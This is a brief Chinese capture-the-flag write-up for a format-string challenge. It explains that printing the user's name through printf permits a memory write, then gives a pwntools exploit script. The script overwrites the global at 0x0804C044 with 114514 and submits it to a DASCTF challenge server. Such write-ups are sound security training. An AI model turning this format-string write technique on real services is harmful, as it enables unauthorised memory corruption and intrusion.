观察main可知，此题最终目的是使得atoi(nptr) == dword_804C044为true

此处无明显的漏洞能读取dword_804C044，但是注意到下方输入名字后，还需要printf输入的名字出来，那么这里只需要利用printf的特性即可将制定的值写入dword_804C044。根据以上内容，利用pwntools的fmtstr即可构建特殊字符串并获取flag
![](https://img.h1kari.cn/blog/images/99d00f0768e2253e89e48899c909eb56b5e9560a66aaa22a1c3f4ff0454aee27.webp)

## EXP
```python
from pwn import *

context.arch = "i386"

def exec_fmt(payload):
    io = process("./pwn")
    io.recvuntil(b"your name:")
    io.sendline(payload)
    out = io.recvuntil(b"your passwd:")
    io.close()
    return out

FMT = FmtStr(exec_fmt)
payload = fmtstr_payload(
    FMT.offset,
    {0x0804C044: 114514}
)

io = remote("468248ee76b3a2339f425700.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="468248ee76b3a2339f425700.tcp-ctf2.dasctf.com")
io.sendlineafter(b"your name:", payload)
io.sendlineafter(b"your passwd:", b"114514")
io.interactive()
```
